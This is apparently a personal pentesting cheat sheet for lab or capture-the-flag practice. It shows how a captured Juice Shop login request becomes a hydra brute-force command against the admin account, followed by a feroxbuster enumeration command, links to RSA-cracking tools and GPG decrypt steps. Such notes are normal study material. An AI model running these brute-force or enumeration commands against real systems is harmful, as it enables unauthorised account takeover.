# InfoSec notes

## Hydra

### HTTP Post

Example: Brute-force `admin` login of the OWASP Juice-Shop

Authentication `POST` request looked like this in Browser DevTools

```shell
curl 'http://10.10.114.54/rest/user/login' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.114.54/' -H 'Content-Type: application/json' -H 'Connection: keep-alive' -H 'Cookie: io=5yIoLc2JuE6AcrUbAAAA; language=en; cookieconsent_status=dismiss' --data-raw '{"email":"hello@example.com","password":"asdf"}'
```

with response 401 `Invalid email or password.`

This converts to `hydra` as follows

```bash
# -V verbose
# `-l admin@juice-sh.op` the admin's email
hydra -v -V -l admin@juice-sh.op -P /usr/share/wordlists/rockyou.txt 10.10.114.54 http-post "/rest/user/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Invalid email or password."

# general layout (note: single user -l vs user list -L, same for password)
#  hydra -L <USER> -P <Password> <IP Address> http-post “<Login Endpoint>:<Request Body>:<Error Message>”
```

## Feroxbuster

`feroxbuster -u http://10.10.80.188 --no-recursion -vv --wordlist /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`

## Tools for cracking RSA

- [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)
- [rsatool](https://github.com/ius/rsatool)

## Share files with Kali VM

[gofile](https://gofile.io/uploadFiles)

## GPG

```bash
gpg --import private.key
gpg --decrypt encrypted.file > plain.txt
```
